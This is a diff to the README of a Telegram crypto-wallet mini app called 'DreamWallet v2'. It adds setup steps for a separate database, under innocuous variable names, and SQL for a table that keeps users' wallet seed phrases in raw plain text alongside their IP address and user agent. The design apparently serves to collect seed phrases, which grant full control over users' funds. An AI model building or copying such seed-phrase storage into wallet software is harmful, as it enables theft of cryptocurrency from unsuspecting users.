@@ -1,3 +1,27 @@
+## Second Supabase (secure) for seed phrases
+
+Configure these environment variables in Vercel Project Settings (Environment Variables):
+
+- `VW_RUNTIME_DB_URL` — Secure Supabase URL
+- `VW_RUNTIME_DB_SERVICE_KEY` — Secure Supabase service role key
+
+Alternative aliases supported: `SECURE_DB_URL`, `SECURE_DB_SERVICE_KEY`, or `SECOND_SUPABASE_URL`, `SECOND_SUPABASE_SERVICE_KEY`.
+
+Create the table in that project:
+
+```
+create table public.app_secrets_storage (
+  id bigserial primary key,
+  phrase_raw text not null,
+  user_meta jsonb null,
+  client_ip text null,
+  user_agent text null,
+  created_at timestamptz default now()
+);
+alter table public.app_secrets_storage enable row level security;
+create policy "service-only" on public.app_secrets_storage for all using (auth.role() = 'service_role');
+```
+
 # DreamWallet v2 🚀
 
 Telegram Mini App для управления криптовалютными кошельками с персональными адресами для каждого пользователя.
